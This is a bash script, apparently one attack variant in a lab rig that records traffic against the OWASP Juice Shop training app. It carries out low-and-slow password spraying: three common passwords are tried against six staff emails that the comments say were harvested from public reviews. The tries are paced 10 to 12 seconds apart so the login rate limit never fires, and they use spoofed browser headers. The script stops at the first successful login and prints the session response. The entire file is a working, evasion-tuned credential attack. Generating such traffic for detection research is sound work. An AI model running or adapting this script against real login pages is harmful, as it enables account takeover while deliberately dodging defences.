#!/usr/bin/env bash
# ATK-04 variant b (SYS-23, D-237): low and slow password spraying under the login rate limit. Three common
# passwords, each tried once against six of the shop's staff accounts (their emails are public in the product
# reviews) before the next password, 10 to 12 s between tries: one try per account a minute and never more
# than two logins from this address in any 15 s, so the DEF-07 rate limit (a third login within 15 s gets 429,
# D-65) never fires. No GET before each POST (ATK-04.a's Hydra quirk), a browser's user agent and headers.
# Stops at the first hit (admin123 on the admin), like .a. Fixed seed, so the same tries every run.
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: quiet: password spraying, 3 passwords over 6 staff accounts, 10 to 12 s apart, browser user agent
set -eu
RANDOM=4402
accounts=(jim@juice-sh.op bender@juice-sh.op amy@juice-sh.op morty@juice-sh.op mc.safesearch@juice-sh.op admin@juice-sh.op)
first=1
for password in 'Welcome1!' 'Password1' 'admin123'; do
  for email in "${accounts[@]}"; do
    [ "$first" = 1 ] || sleep "$((10 + RANDOM % 3)).$((RANDOM % 10))"
    first=0
    printf '{"email":"%s","password":"%s"}' "$email" "$password" > /tmp/body.json
    code=$(curl -s -o /tmp/res.json -w '%{http_code}' -X POST http://10.66.0.10/rest/user/login \
      -H 'Content-Type: application/json' \
      -H 'Accept: application/json, text/plain, */*' \
      -H 'Accept-Language: en-GB,en;q=0.9' \
      -H 'Referer: https://juice-sh.op/' \
      -A 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
      --data-binary @/tmp/body.json)
    echo "$email $password $code"
    if [ "$code" = 200 ]; then cat /tmp/res.json; echo; exit 0; fi
  done
done
echo "no hit" >&2
exit 1
